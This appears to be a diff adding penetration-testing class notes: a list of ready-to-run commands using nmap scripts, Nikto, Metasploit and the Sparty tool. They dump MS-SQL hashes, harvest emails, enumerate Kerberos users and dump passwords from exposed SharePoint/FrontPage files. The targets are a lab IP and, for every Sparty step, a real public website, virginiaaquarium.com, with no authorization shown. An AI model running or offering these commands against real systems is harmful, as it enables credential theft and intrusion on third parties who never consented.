@@ -1,0 +1,163 @@
+##############
+# Using Nmap #
+##############
+sudo nmap -sV 172.31.43.151
+
+sudo nmap -Pn -n --open -p1433 --script=ms-sql-dump-hashes,ms-sql-empty-password,ms-sql-info 172.31.43.151
+
+sudo nmap -Pn -n --open -p80 --script=http-email-harvest --script-args=http-email-harvest.maxpagecount=100,http-email-harvest.maxdepth=10 172.31.43.151
+
+sudo nmap -Pn -n --open -p80 --script=http* 172.31.43.151
+
+sudo nmap -Pn -n --open -p80 --script=http-title 172.31.43.151
+
+sudo nmap -Pn -n --open -p80 --script=http-headers 172.31.43.151
+
+
+sudo nmap -Pn -n --open -p3389 --script=rdp-vuln-ms12-020,rdp-enum-encryption 172.31.43.151
+
+sudo nmap -Pn -n --open -p80 --script='(+http* and not http-icloud-findmyiphone,http-icloud-sendmsg,http-virustotal,)' 172.31.43.151
+
+sudo nmap -Pn -n --open -p80 --script http-ntlm-info --script-args http-ntlm-info.root=172.31.43.151
+
+
+
+
+
+cd ~
+echo bob >> list.txt
+echo jim >> list.txt
+echo joe >> list.txt
+echo tim >> list.txt
+echo admin >> list.txt
+echo hello >> list.txt
+echo rob >> list.txt
+echo test >> list.txt
+echo aaaaaa >> list.txt
+echo larry >> list.txt
+echo mario >> list.txt
+echo jason >> list.txt
+echo john >> list.txt
+
+sudo nmap -Pn -n --open -p88 --script-args krb5-enum-users.realm='domain.local',userdb=list.txt 172.31.43.151
+
+
+
+###############
+# Using Nikto #
+###############
+cd ~/toolz/nikto-2.1.1
+ 
+perl nikto.pl -update
+ 
+perl nikto.pl -h 172.31.43.151
+
+
+
+
+
+cd ~/toolz/metasploit
+
+./msfconsole
+
+use auxiliary/gather/kerberos_enumusers
+
+set RHOSTS 172.31.43.151
+
+set DOMAIN Domain.Local
+
+set USER_FILE /home/strategicsec/list.txt
+
+run
+
+
+
+
+################
+# Using Sparty #
+################
+cd ~/toolz
+
+git clone https://github.com/adityaks/sparty.git
+
+cd sparty/sparty_v_0.1/
+
+
+[*] Sparty - Usage Parameters and Help !
+
+python sparty_v_0.1.py -h
+
+
+
+[*] Sharepoint/ Frontpage Version Fingerprinting !
+
+python sparty_v_0.1.py -v ms_frontpage -u http://172.31.43.151 
+
+python sparty_v_0.1.py -v ms_frontpage -u https://www.virginiaaquarium.com/
+
+
+[*] Dumping Passwords from Exposed Files !
+
+python sparty_v_0.1.py -d dump -u http://172.31.43.151 
+
+python sparty_v_0.1.py -d dump -u https://www.virginiaaquarium.com/
+
+
+
+
+
+[*] Indexing Check for Critical Directories !
+
+python sparty_v_0.1.py -l list -u http://172.31.43.151 
+
+python sparty_v_0.1.py -l list -u https://www.virginiaaquarium.com
+
+
+
+
+[*] Scanning Access Rights on Frontpage Files (_vti_pvt and _vti_bin directories) !
+
+python sparty_v_0.1.py -f pvt -u http://172.31.43.151
+
+python sparty_v_0.1.py -f pvt -u https://www.virginiaaquarium.com
+
+
+
+
+
+[*] Scanning Access Rights on Sharepoint Files (forms, layouts and catalogs directories) !
+
+python sparty_v_0.1.py -s layouts -u http://172.31.43.151
+
+python sparty_v_0.1.py -s layouts -u https://www.virginiaaquarium.com
+
+
+
+
+
+[*] Exposed Services Check !
+
+python sparty_v_0.1.py -i services -u https://172.31.43.151
+
+python sparty_v_0.1.py -i services -u https://www.virginiaaquarium.com
+
+
+
+
+
+
+[*] Frontpage RPC Querying !
+
+python sparty_v_0.1.py -e rpc_version_check -u https://172.31.43.151
+
+python sparty_v_0.1.py -e rpc_version_check -u https://www.virginiaaquarium.com
+
+
+
+
+
+[*] Frontpage - Service Listing !
+
+python sparty_v_0.1.py -e rpc_service_listing -u http://172.31.43.151
+
+python sparty_v_0.1.py -e rpc_service_listing -u https://www.virginiaaquarium.com
